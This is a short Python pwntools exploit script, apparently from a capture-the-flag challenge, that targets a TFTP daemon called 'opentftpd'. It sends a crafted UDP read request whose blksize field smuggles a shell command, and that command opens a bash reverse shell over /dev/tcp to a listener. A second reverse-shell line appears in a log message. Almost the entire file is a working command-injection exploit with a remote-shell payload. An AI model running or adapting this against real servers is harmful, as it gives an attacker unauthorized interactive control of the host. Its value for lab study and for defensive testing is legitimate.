#!/usr/bin/env python
import sys, os
from pwn import *
from time import sleep
from binascii import hexlify

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('0.0.0.0', 5566)
elf = ELF('docker/source/opentftpd'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def read_req(r, filename, mode='ascii', blksize=512, timeout=3):
    r.send('\x00\x01{}\x00{}\x00blksize\x00{}\x00timeout\x00{}'.format(filename, mode, blksize, timeout))
    r.recv(timeout=0.1)

r = remote(HOST, PORT, typ='udp')

remote_ip = '127.0.0.1'
log.warning('system("bash -i >& /dev/tcp/$ip/5566 0>&1")')
read_req(r, filename='/share/gg', blksize='bash -c "bash -i >& /dev/tcp/{}/1234 0>&1"'.format(remote_ip))

r.close()
